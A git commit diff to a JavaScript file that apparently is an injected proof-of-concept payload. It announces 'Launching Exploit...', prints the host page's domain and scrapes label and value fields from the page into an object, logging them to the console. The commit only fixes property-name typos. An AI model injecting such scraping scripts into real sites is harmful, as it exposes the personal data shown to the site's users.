50afe7972efb0f599a6b6f208c58b4867190a40b
Fish <64684124+Fish-o@users.noreply.github.com>
2023-01-07 21:18:09 +0100

    Update x2.js

--- assets/js/x2.js
+++ assets/js/x2.js
@@ -4,13 +4,13 @@ function main_func(){
   console.log("Dit is mijn domain: "+document.domain);
   console.log("\nLaunching Exploit...")
   const name_el = document.getElementsByClassName("header")?.[0];
-  console.log("Name", name_el.innerHtml);
+  console.log("Name" + name_el.innerHTML);
   setTimeout(()=>{
     const els = Array.prototype.slice.call(document.getElementsByClassName("twopartfields"));
     const data = {}
     for (let i = 0; i < els.length; i+=2){
-      const label = els[i].innerHtml;
-      const info = els[i+1].querySelector('span').innerHtml;
+      const label = els[i].innerHTML;
+      const info = els[i+1].querySelector('span').innerHTML;
       data[label] = info;
       console.log(data);
     }
